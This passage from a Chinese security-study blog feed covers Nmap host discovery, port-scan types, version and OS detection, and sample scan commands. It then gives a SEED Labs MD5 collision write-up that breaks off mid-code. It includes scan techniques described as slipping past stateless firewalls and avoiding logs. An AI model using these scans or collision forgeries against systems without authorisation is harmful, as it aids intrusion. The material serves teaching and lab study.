或<code>SYN/ACK</code>响应告诉 <code>Nmap</code>主机可用且有响应。注意：-PS和端口列表间无空格。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048780.png"alt="image-20230925152824970" /><figcaption aria-hidden="true">image-20230925152824970</figcaption></figure><h2 id="pa-tcp-ack-ping">2.5 -PA <port list>(TCP ACK Ping)</h2><p><code>TCP ACK ping</code> 与刚才讨论的 SYN ping非常相似。两者的区别在于设置的是 <code>TCP ACK</code> 标志，而不是<code>SYN</code>标志。同时提供<code>SYN</code> 和 <code>ACK</code>ping探测的原因是为了最大限度地绕过防火墙。该<code>-PA</code>选项使用与 SYN探测 (80) 相同的默认端口，并且还可以采用相同格式的目标端口列表。这种<code>ACK</code>数据包声称通过已建立的 TCP连接确认数据，但实际上并不存在这样的连接。因此，远程主机应始终响应一个<code>RST</code>数据包，在此过程中暴露自己的存在。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048781.png"alt="image-20230925153349280" /><figcaption aria-hidden="true">image-20230925153349280</figcaption></figure><h2 id="pu-udp-ping">2.6 -PU <port list> (UDP Ping)</h2><p>该方法会向指定端口发送<code>UDP</code>数据包。对于大多数端口，数据包都是空的，但有些端口会使用特定协议的有效载荷，这样更有可能得到响应。端口列表的格式与前面讨论过的-PS 和 -PA 选项相同。如果没有指定端口，默认值为40125。默认情况下使用的是一个非常不常用的端口，因为对于这种特殊的扫描类型来说，向开放端口发送数据通常是不可取的。一旦命中中目标计算机上的一个关闭端口，<code>UDP</code>探测器应返回一个 <code>ICMP</code>端口不可达数据包。这就向<code>Nmap</code>表明机器是正常运行的。许多其他类型的<code>ICMP</code>错误，如主机/网络不可到达或超过TTL，都表明主机已停机或不可到达。无响应也可以这样解释。如果到达的是开放端口，大多数服务会直接忽略空数据包，不返回任何响应。这就是默认探测端口为40125 的原因，该端口被使用的可能性很小。字符生成器<code>chargen</code>协议等少数服务会响应空 <code>UDP</code>数据包，从而向 <code>Nmap</code> 透露机器可用。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048782.png"alt="image-20230925153850582" /><figcaption aria-hidden="true">image-20230925153850582</figcaption></figure><h2 id="py-sctp-init-ping">2.7 -PY <port list> (SCTP INIT Ping)</h2><p>该选项发送包含最小<code>INIT</code> 块的 <code>SCTP</code>数据包。<code>INIT</code>块向远程系统表明，您正试图建立关联。通常情况下，目标端口关闭，并将发送一个<code>ABORT</code> 块。如果端口碰巧是开放的，目标系统将采取<code>SCTP</code>四次握手的第二步，用一个 <code>INIT-ACK</code> chunk作为回应。如果运行 <code>Nmap</code>的机器有一个功能正常的<code>SCTP</code>协议栈，那么它就会通过响应一个<code>ABORT</code>数据块而不是发送一个<code>COOKIE-ECHO</code>数据块（这将是四路握手的下一步）来破坏连接。<code>ABORT</code>包由运行<code>Nmap</code>的机器内核发送，以响应意外的<code>INIT-ACK</code>，而不是由<code>Nmap</code> 本身发送。前面讨论过的<code>ABORT</code>或<code>INIT-ACK</code> 响应都会告诉<code>Nmap</code>，主机是可用的并有响应。</p><h2 id="pe--pp--pm-icmp-ping-types">2.8 -PE; -PP; -PM (ICMP PingTypes)</h2><p><code>Nmap</code> 向目标<code>IP</code>地址发送<code>ICMP</code>类型8（回显请求）数据包，期望从可用主机返回类型 0（回显应答）。不幸的是，对于网络浏览器来说，许多主机和防火墙现在会阻止这些数据包，而不是按照RFC1122 的要求进行响应。 因此，针对 Internet 上的未知目标，仅<code>ICMP</code>扫描很少足够可靠。但对于监控内部网络的系统管理员来说，它们可能是一种实用且有效的方法。使用该-PE选项启用此回显请求行为。<code>ICMP</code>标准（RFC792 和 RFC 950）还将时间戳请求、信息请求和地址掩码请求数据包分别指定为代码 13、15 和17。时间戳和地址掩码查询可以分别使用 -PP和-PM选项发送。</p><h2 id="po-ip-协议-ping">2.9 -PO <protocol list>(IP 协议 Ping)</h2><p><code>IP</code>协议 ping 是较新的主机发现选项之一，它发送的<code>IP</code>数据包在其 <code>IP</code>头中设置了指定的协议号。协议列表的格式与前面讨论的<code>TCP</code>、<code>UDP</code>和 <code>SCTP</code>主机发现选项中的端口列表相同。此主机发现方法查找使用与探针相同的协议的响应，或者查找表示目标主机不支持给定协议的<code>ICMP</code>协议不可达消息。无论哪种类型的响应都表明目标主机存活。</p><h2 id="prarp-ping">2.10 -PR(ARP Ping)</h2><p>当启动<code>Namp</code>主机发现时候，<code>Nmap</code>会对目标地址参数进行检查，如果与自身<code>IP</code>地址匹配到同一个子网内，<code>Nmap</code>会对该类目标采用<code>ARP</code>协议进行探测。即使命令参数规定的是其他探测手段，也会先使用<code>ARP</code>进行探测。这种方式效率高，速度快，但仅限于同一子网广播域中。<code>ARP</code>（AddressResolutionProtocol，地址解析协议）是用来将<code>IP</code>地址解析为<code>MAC</code>地址的协议。主机或三层网络设备上会维护一张<code>ARP</code>表，用于存储<code>IP</code>地址和<code>MAC</code>地址的映射关系，一般<code>ARP</code>表项包括动态<code>ARP</code>表项和静态<code>ARP</code>表项。</p><h2 id="disable-arp-ping-no-arp-or-nd-ping">2.11 --disable-arp-ping (NoARP or ND Ping)</h2><p><code>Nmap</code> 通常会发现本地连接的以太网主机的 <code>ARP</code>或 <code>IPv6</code>邻居发现 (ND)，即使使用了 <code>-Pn</code>或<code>-PE</code>等其他主机发现选项。要禁用这种隐式行为，请使用<code>--disable-arp-ping</code>选项。</p><h2 id="discovery-ignore-rst">2.12 --discovery-ignore-rst</h2><p>在某些情况下，防火墙可能会欺骗 <code>TCP</code> 重置(<code>RST</code>) 回复，以响应对未占用或不允许的地址的探测。由于<code>Nmap</code>通常会将 <code>RST</code>回复视为目标已启动的证明，这可能导致浪费扫描不存在的目标的时间。使用<code>--discovery-ignore-rst</code>会阻止<code>Nmap</code>在发现主机时考虑这些回复。您可能需要选择额外的主机发现选项，以确保在这种情况下不会错过目标。</p><h2 id="traceroute跟踪主机路径">2.13 --traceroute(跟踪主机路径)</h2><p><code>Traceroute</code>的工作原理是发送TTL（生存时间）较低的数据包，试图从扫描器和目标主机之间的中间跳诱发<code>ICMP</code>时间超限信息。标准的<code>traceroute</code> 实现以 1 的 TTL 开始，并递增 TTL直到到达目标主机。<code>Nmap</code>的<code>traceroute</code>从高TTL开始，然后递减TTL，直到TTL为零。这样做可以让<code>Nmap</code>采用巧妙的缓存算法，加快对多台主机的跟踪。根据网络条件，<code>Nmap</code>平均每台主机少发送5-10 个数据包。如果扫描的是单个子网（如192.168.0.0/24），<code>Nmap</code>可能只需向大多数主机发送两个数据包。</p><h1 id="端口扫描">3 端口扫描</h1><h2 id="端口状态">3.1 端口状态</h2><ul><li><code>open</code></li><li><code>closed</code></li><li><code>filterd</code></li><li><code>unfilterd</code></li><li><code>open|unfilterd</code></li><li><code>closed|unfilterd</code></li></ul><h2 id="概述-1">3.2 概述</h2><ul><li><p>虽然 Nmap试图生成准确的结果，但请记住，它的所有见解都是基于目标机器（或它们前面的防火墙）返回的数据包。这类主机可能不值得信任，它们发送的响应会迷惑或误导Nmap。更常见的是不符合 RFC 标准的主机，它们不会对 Nmap探测作出应有的响应。FIN、NULL 和 Xmas扫描特别容易出现这种问题。</p></li><li><p>大多数扫描类型只有特权用户才能使用。这是因为发送和接收原始数据包需要Unix 系统的 root 访问权限。</p></li><li><p>本节记录了 Nmap支持的十几种端口扫描技术。一次只能使用一种方法，除了 UDP 扫描 (-sU)和任何一种 SCTP 扫描类型 (-sY, -sZ) 可以与任何一种 TCP扫描类型结合使用。为便于记忆，端口扫描类型选项的形式为 -s<C>，其中 <C>是扫描名称中的一个突出字符，通常是第一个字符。唯一的例外是已废弃的 FTP反弹扫描 (-b)。默认情况下，Nmap 执行 SYN扫描，但如果用户没有发送原始数据包的适当权限（在 Unix 上需要 root访问权限），Nmap会用连接扫描代替。在本节列出的扫描中，非特权用户只能执行连接和 FTP反弹扫描。</p></li></ul><h2 id="ss-tcp-syn-scan">3.3 <code>-sS</code> (TCP SYN scan)</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048783.png"alt="image-20230928092641400" /><figcaption aria-hidden="true">image-20230928092641400</figcaption></figure><ul><li>半连接扫描基于TCP三次握手规则，探测服务端口是否开放。</li><li>服务端口开放，会返回 SYN/ACK 消息；如果收到 SYN 数据包（不含 ACK标志）的响应，端口也会被认为是开放的。这可能是由于一种极为罕见的 TCP功能造成的，这种功能被称为同时打开或分裂握手连接。</li><li>服务端口关闭，会返回RST消息。</li><li>如果数次重发后仍没响应，该端口就被标记为被过滤。如果收到ICMP不可到达错误(类型3，代码1，2，3，9，10，或者13)，该端口也被标记为被过滤。</li><li>优点：一般不会被目标主机的应用所记录。</li><li>缺点：运行Raw Socket时必须拥有管理员权限。</li></ul><h2 id="st-tcp-connect-scan">3.4 <code>-sT</code> (TCP connectscan)</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048784.png"alt="image-20230928092955007" /><figcaption aria-hidden="true">image-20230928092955007</figcaption></figure><ul><li>左边为服务端，右边为客户端。</li><li>当 无法使用SYN 扫描时，TCP 连接扫描是默认的 TCP扫描类型。当用户没有原始数据包权限时就是这种情况。</li><li>Nmap 不像大多数其他扫描类型那样写入原始数据包，而是通过发出 connect系统调用，使用此 API来获取每次连接尝试的状态信息，而不是从网上读取原始数据包响应。</li><li>优点：实现简单、可以用普通用户权限执行</li><li>缺点：容易被目标应用日志所记录</li></ul><h2 id="su-udp-scans">3.5 <code>-sU</code> (UDP scans)</h2><ul><li>虽然互联网上大多数流行服务都是通过 TCP 协议运行的，但 UDP服务也被广泛部署。DNS、SNMP 和 DHCP（注册端口 53、161/162 和67/68）是最常见的三种服务。</li><li>UDP 扫描使用 -sU 选项激活。它可以与 SYN 扫描 (-sS) 等 TCP扫描类型结合使用，在同一运行过程中同时检查两种协议。</li><li>如果返回 ICMP 端口不可到达错误（类型 3，代码3），端口将被关闭。</li><li>其他 ICMP 不可到达错误（类型 3，代码 0、1、2、9、10 或13）会将端口标记为已过滤。</li><li>偶尔，服务会响应一个 UDP 数据包，证明它是开放的。</li><li>如果重传后没有收到响应，端口就会被归类为 "开放"|"已过滤"。</li><li>缺点：扫描速度慢。解决方案：并行扫描更多主机、先对常用端口进行快速扫描、从防火墙后面进行扫描，以及使用--host-timeout 跳过慢速主机。</li></ul><h2 id="sy-sctp-init-scan">3.6 <code>-sY</code> (SCTP INIT scan)</h2><ul><li>SCTP 是 TCP 和 UDP 协议的一种相对较新的替代协议，它结合了 TCP 和 UDP协议的大多数特性，并增加了新的功能，如multi-homing和multi-streaming。</li><li>这种技术通常被称为半开扫描，因为你不会打开一个完整的 SCTP关联。您发送的是 INIT块，就好像您要打开一个真正的关联，然后等待响应。</li><li>INIT-ACK 块表示端口正在监听（打开）。</li><li>ABORT 块则表示端口未监听。</li><li>如果数次重传后仍未收到响应，端口就会被标记为已被过滤。如果收到 ICMP不可到达错误（类型 3，代码 0、1、2、3、9、10 或13），端口也会被标记为已过滤。</li></ul><h2 id="sn--sf--sx-tcp-null-fin-and-xmas-scans">3.7 <code>-sN</code>;<code>-sF</code>; <code>-sX</code> (TCP NULL, FIN, and Xmas scans)</h2><ul><li>假设扫描系统遵循RFC标准，如果收到一个RST报文，该端口被认为是closed(关闭的)</li><li>没有响应则意味着端口是open|filtered(开放或者被过滤的)</li><li>如果收到ICMP不可到达错误(类型 3，代号1，2，3，9，10，或者13)，该端口就被标记为被过滤的。</li><li>优点：它们能躲过一些无状态防火墙和报文过滤路由器，不会被记录到日志</li><li>缺点：大部分系统并不遵循该标准</li><li>FIN扫描 (-sF)：只设置TCP FIN标志位。</li><li>Null扫描 (-sN)：不设置任何标志位(tcp标志头是0)</li><li>Xmas扫描 (-sX)：设置FIN，PSH，和URG标志位</li><li>除了探测报文的标志位不同，这三种扫描在行为上完全一致。</li><li>主要优势：它们可以偷偷穿过某些非状态防火墙和数据包过滤路由器。另一个优势是，这些扫描类型甚至比SYN 扫描更隐蔽。</li></ul><h2 id="sa-tcp-ack-scan">3.8 <code>-sA</code> (TCP ACK scan)</h2><ul><li>ACK 扫描探测包只设置 ACK 标志（除非使用 --scanflags）。</li><li>扫描未过滤系统时，打开和关闭的端口都会返回一个 RST 数据包。Nmap会将这些端口标记为未过滤端口，这意味着 ACK数据包可以到达这些端口，但无法确定这些端口是开放的还是关闭的。</li><li>没有响应或发送某些 ICMP 错误信息（类型 3，代码 0、1、2、3、9、10 或13）的端口会被标记为已过滤。</li></ul><h2 id="sw-tcp-window-scan">3.9 <code>-sW</code> (TCP Window scan)</h2><ul><li>窗口扫描与 ACK扫描完全相同，只是它利用某些系统的实现细节来区分开放端口和关闭端口。</li><li>在某些系统中，开放端口使用正窗口大小（即使是 RST数据包），而关闭端口的窗口大小为零。</li><li>这种扫描依赖于互联网上少数系统的实现细节，因此不能总是相信它。</li></ul><h2 id="sm-tcp-maimon-scan">3.10 <code>-sM</code> (TCP Maimon scan)</h2><ul><li>该技术与 NULL、FIN 和 Xmas 扫描完全相同，只是探针是 FIN/ACK。</li><li>根据 RFC 793（TCP），无论端口是开放还是关闭，都应该生成一个 RST数据包来响应这种探测。</li><li>不过，Uriel 注意到，如果端口是开放的，许多 BSD衍生系统会直接丢弃数据包。</li></ul><h2 id="scanflags-custom-tcp-scan">3.11 <code>--scanflags</code> (CustomTCP scan)</h2><ul><li>--scanflags 参数可以是一个数字标志值，如 9（PSH 和FIN），但使用符号名称更方便。</li><li>除了指定所需的标记外，还可以指定 TCP 扫描类型（如 -sA 或-sF）。</li></ul><h2 id="sz-sctp-cookie-echo-scan">3.12 <code>-sZ</code> (SCTP COOKIEECHO scan)</h2><ul><li>利用了 SCTP 实现应在开放端口上静默丢弃包含 COOKIE ECHO块的数据包，但在端口关闭时发送 ABORT 的事实。</li><li>这种扫描类型的优点是，它的端口扫描不像 INIT扫描那么明显。此外，非状态防火墙规则集可能会阻止 INIT 数据块，但不会阻止COOKIE ECHO 数据块。不要以为这样就能使端口扫描不可见；好的 IDS也能检测到 SCTP COOKIE ECHO 扫描。</li><li>缺点是 SCTP COOKIE ECHO扫描无法区分开放端口和过滤端口，因此在两种情况下都会出现 open|filtered状态。</li></ul><h2 id="si-idle-scan">3.13 <code>-sI</code><zombie host>[:<probeport>](idle scan)</h2><ul><li>这种先进的扫描方法允许对目标进行真正的盲 TCP端口扫描（这意味着不会从您的真实 IP地址向目标发送数据包）。相反，一种独特的侧信道攻击会利用僵尸主机上可预测的IP 碎片 ID 序列生成来收集目标机开放端口的信息。</li><li>这种扫描类型还允许绘制机器之间基于 IP 的信任关系图。</li><li>如果您想探测僵尸主机上的特定端口，以了解 IP ID的变化，您可以在僵尸主机后添加冒号和端口号。否则 Nmap 将使用默认用于 TCPping 的端口 (80)。</li></ul><h2 id="so-ip-protocol-scan">3.14 <code>-sO</code> (IP protocolscan)</h2><ul><li>IP 协议扫描允许您确定目标计算机支持哪些 IP 协议（TCP、ICMP、IGMP等）。</li><li>如果 Nmap 从目标主机收到任何协议的响应，Nmap就会将该协议标记为打开。</li><li>ICMP 协议不可到达错误（类型 3，代码2）会导致协议被标记为关闭，而端口不可到达（类型 3，代码3）会导致协议被标记为打开。</li><li>其他 ICMP 不可到达错误（类型 3，代码 0、1、9、10 或13）会导致协议被标记为已过滤（尽管它们同时证明 ICMP 是开放的）。</li><li>如果重传后仍未收到响应，则标记为协议已打开|已过滤</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309281048785.png"alt="image-20230928100330382" /><figcaption aria-hidden="true">image-20230928100330382</figcaption></figure><h2 id="bftp-bounce-scan">3.15 <code>-b</code><FTP relay host>(FTPbounce scan)</h2><ul><li>利用FTP 服务器对其他主机进行端口扫描。只需让 FTP服务器依次向目标主机的每个感兴趣的端口发送文件即可。</li><li>错误信息将说明端口是否开放。</li><li>这是一种绕过防火墙的好方法，因为企业的 FTP服务器通常比任何旧的互联网主机更容易访问其他内部主机。</li><li>该漏洞现已基本修复。</li></ul><h1 id="服务和版本检测">4 服务和版本检测</h1><h2 id="sv-version-detection">4.1 <code>-sV</code> (Versiondetection)</h2><p>-sR 是 -sV 的别名。</p><h2 id="allports-dont-exclude-any-ports-from-version-detection">4.2<code>--allports</code> (Don't exclude any ports from versiondetection)</h2><p>默认情况下，Nmap 版本检测会跳过 TCP 9100端口，因为有些打印机会简单地打印发送到该端口的任何内容，导致几十页的HTTP GET 请求、二进制 SSL 会话请求等。</p><h2 id="version-intensity-intensity-set-version-scan-intensity">4.3<code>--version-intensity &lt;intensity&gt;</code> (Set version scanintensity)</h2><p>执行版本扫描 (-sV) 时，Nmap 会发送一系列探针，每个探针的稀有度值介于1 到 9之间。编号较低的探针对各种常见服务有效，而编号较高的探针则很少有用。强度级别规定了应使用哪些探针。数字越大，正确识别服务的可能性就越大。不过，高强度扫描需要更长的时间。强度必须在0 到 9 之间。通过 nmap-service-probes ports指令向目标端口注册探针时，无论强度级别如何，都会尝试该探针。这样可以确保DNS 探测总是针对任何开放的 53 端口，SSL 探测针对 443 端口等。</p><h2 id="version-light-enable-light-mode">4.4<code>--version-light</code> (Enable light mode)</h2><p>这是 --version-intensity 2的别名。这种轻度模式使版本扫描速度更快，但识别服务的可能性略低。</p><h2 id="version-all-try-every-single-probe">4.5<code>--version-all</code> (Try every single probe)</h2><p>--version-intensity 9 的别名，确保对每个端口都进行一次探测。</p><h2 id="version-trace-trace-version-scan-activity">4.6<code>--version-trace</code> (Trace version scan activity)</h2><p>这会导致 Nmap 打印出大量关于版本扫描正在进行的调试信息。它是--packet-trace 的子集。</p><h1 id="操作系统检测">5 操作系统检测</h1><p>Nmap 最著名的功能之一是使用 TCP/IP 堆栈指纹进行远程操作系统检测。Nmap向远程主机发送一系列 TCP 和 UDP数据包，并检查响应中的几乎每一位。在执行了数十项测试（例如 TCP ISN采样、TCP 选项支持和排序、IP ID 采样以及初始窗口大小检查）后，Nmap将结果与它的结果进行比较 <code>nmap-os-db</code> 数据库包含 2,600多个已知操作系统指纹，如果匹配则打印出操作系统详细信息。</p><h2 id="o-enable-os-detection">5.1 <code>-O</code> (Enable OSdetection)</h2><p>启用操作系统检测</p><h2 id="osscan-limit-limit-os-detection-to-promising-targets">5.2<code>--osscan-limit</code> (Limit OS detection to promisingtargets)</h2><p>如果发现至少一个打开的 TCP 端口和一个关闭的 TCP端口，操作系统检测就会有效得多。设置此选项后，Nmap甚至不会尝试对不符合此标准的主机进行操作系统检测。这可以节省大量时间，特别是在对许多主机进行-Pn 扫描时。它只在使用 -O 或 -A 请求操作系统检测时才起作用。</p><h2 id="osscan-guess---fuzzy-guess-os-detection-results">5.3<code>--osscan-guess</code>; <code>--fuzzy</code> (Guess OS detectionresults)</h2><p>允许进行近似匹配</p><h2id="max-os-tries-set-the-maximum-number-of-os-detection-tries-against-a-target">5.4<code>--max-os-tries</code> (Set the maximum number of OS detectiontries against a target)</h2><p>当 Nmap对目标执行操作系统检测但未能找到完美匹配时，它通常会重复尝试。默认情况下，如果条件有利于提交操作系统指纹，Nmap会尝试五次；如果条件不太好，Nmap 会尝试两次。</p><h1 id="nmap常用命令">6 Nmap常用命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取远程主机的系统类型及开放端口</span><br>nmap -sS -P0 -sV -O &lt; target &gt;<br><span class="hljs-comment"># 其他选项</span><br><span class="hljs-comment"># -A 同时打开操作系统指纹和版本检测</span><br><span class="hljs-comment"># -v 详细输出扫描情况.</span><br>nmap -sS -P0 -A -v &lt; target &gt;<br></code></pre></td></tr></table></figure><p>参考资料：</p><ol type="1"><li><code>Nmap</code>官方文档：https://nmap.org/book/man.html</li><li>https://cshihong.github.io/2019/09/24/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</li><li>https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=141607</li></ol>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
      <category>实验篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MD5 Collision Attack</title>
    <link href="/2023/09/27/SEED-LABS/Cryptography/MD5-Collision-Attack/"/>
    <url>/2023/09/27/SEED-LABS/Cryptography/MD5-Collision-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="md5算法流程">1 MD5算法流程</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032637.png"alt="MD5流程" /><figcaption aria-hidden="true">MD5流程</figcaption></figure><h1 id="实验过程">2 实验过程</h1><h2id="task-1generating-two-different-files-with-the-same-md5-hash">Task1：Generating Two Different Files with the Same MD5 Hash</h2><ul><li><p><strong>Question 1.</strong> If the length of your prefix file isnot multiple of 64, what is going to happen?</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032639.png"alt="image-20230927195026732" /><figcaption aria-hidden="true">image-20230927195026732</figcaption></figure><ol type="1"><li><p>步骤1：生成小于64字节（或其他不是64字节倍数）的前缀文件；步骤2：指定前缀，生成两个具有相同MD5哈希值的不同文件；步骤3：检查输出文件是否相同；步骤4&amp;步骤5：分别检查每个输出文件的MD5 哈希值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032640.png"alt="image-20230927195104857" /><figcaption aria-hidden="true">image-20230927195104857</figcaption></figure></li><li><p>发现两个输出文件不同，但它们的MD5哈希值相同。</p></li><li><p>使用十六进制编辑器软件bless对比分析两个输出文件，命令格式：<code>bless fileName</code>。结论：前64（0x40）字节使用了空字符填充；剩余部分内容大致相同，仅有少数字节不同，如下图中勾选部分。填充原因：MD5处理大小为64字节的块。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032641.png"alt="image-20230927195612726" /><figcaption aria-hidden="true">image-20230927195612726</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032642.png"alt="image-20230927195637940" /><figcaption aria-hidden="true">image-20230927195637940</figcaption></figure></li></ol></li></ul><p>​</p><ul><li><p><strong>Question 2.</strong> Create a prefix file with exactly 64bytes, and run the collision tool again, and see what happens.</p><ol type="1"><li><p>步骤1：生成64字节的前缀文件（末尾会有一个换行符，所以实际输入字符为63个）；步骤2：指定前缀，生成两个具有相同MD5哈希值的不同文件；步骤3：检查输出文件是否相同；步骤4：分别检查每个输出文件的MD5 哈希值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032643.png"alt="image-20230927195753720" /><figcaption aria-hidden="true">image-20230927195753720</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032644.png"alt="image-20230927195811834" /><figcaption aria-hidden="true">image-20230927195811834</figcaption></figure></li><li><p>同样发现两个输出文件不同，但它们的MD5哈希值相同。</p></li><li><p>使用十六进制编辑器软件bless对比分析两个输出文件。发现此次输出文件中未进行补零；同样，前缀部分完全相同，剩余部分除部分字节外大致相同。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032645.png"alt="image-20230927195827718" /><figcaption aria-hidden="true">image-20230927195827718</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032646.png"alt="image-20230927195848313" /><figcaption aria-hidden="true">image-20230927195848313</figcaption></figure></li></ol></li></ul><p>​</p><ul><li><p><strong>Question 3.</strong> Are the data (128 bytes) generatedby md5collgen completely different for the two output files? Pleaseidentify all the bytes that are different.</p><p>answer：没有完全不同。Question 1中有5个字节不同，Question2中有6个字节不同。不同之处为上述图中勾画部分。</p></li></ul><h2 id="task-2-understanding-md5s-property">Task 2: Understanding MD5’sProperty</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032647.png"alt="image-20230927200007327" /><figcaption aria-hidden="true">image-20230927200007327</figcaption></figure><ol type="1"><li><p>MD5算法属性：给定两个输入M，N如果MD5(M) =MD5(N)，那么对于任何输入T，MD5(M || T) = MD5(N ||T)。因此，将特定的suffix添加到具有相同 MD5散列的任何两个不同消息中，通过连接原始消息和suffix消息，得到两个新的更长消息，这两个消息也具有相同的MD5 散列。</p></li><li><p>步骤1：构造前缀文件；步骤2：指定前缀，生成两个具有相同 MD5哈希值的文件；步骤3：检查输出文件是否相同；步骤4：构造后缀文件；步骤5&amp;步骤6：分别使用cat命令对两个文件（生成的输出文件+后缀文件）进行拼接；步骤7：查看各个文件MD5哈希值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032648.png"alt="image-20230927200103119" /><figcaption aria-hidden="true">image-20230927200103119</figcaption></figure></li><li><p>结论：观察得到两个具有不同内容，但MD5哈希值相同的文件，拼接上同一个后缀之后，它们的MD5哈希值仍然相同。因此，给定两个输入M，N如果MD5(M)= MD5(N)，那么对于任何输入T，MD5(M || T) = MD5(N ||T)，该属性得证。注意：拼接后缀后的哈希值与原哈希值不同。</p></li></ol><h2id="task-3-generating-two-executable-files-with-the-same-md5-hash">Task3: Generating Two Executable Files with the Same MD5 Hash</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032649.png"alt="image-20230927200323704" /><figcaption aria-hidden="true">image-20230927200323704</figcaption></figure><ol type="1"><li><p>相关命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># The first command above saves the first 3200 bytes of a.out to prefix.</span><br><span class="hljs-comment"># The second command saves the last 100 bytes of a.out to suffix. </span><br><span class="hljs-comment"># The third command saves the data from the 3300th byte to the end # of the file a.out（左开右闭区间） to suffix.</span><br>$ <span class="hljs-built_in">head</span> -c 3200 a.out &gt; prefix<br>$ <span class="hljs-built_in">tail</span> -c 100 a.out &gt; suffix<br>$ <span class="hljs-built_in">tail</span> -c +3300 a.out &gt; suffix<br></code></pre></td></tr></table></figure></li><li><p>目标：创建两个 MD5 哈希值相同但输出不同的程序。</p></li><li><p>根据实验说明编写demo.c程序，并进行编译。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> xyz[<span class="hljs-number">200</span>] = &#123;<br><span class="hljs-comment">/* The actual contents of this array are up to you */</span><br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span 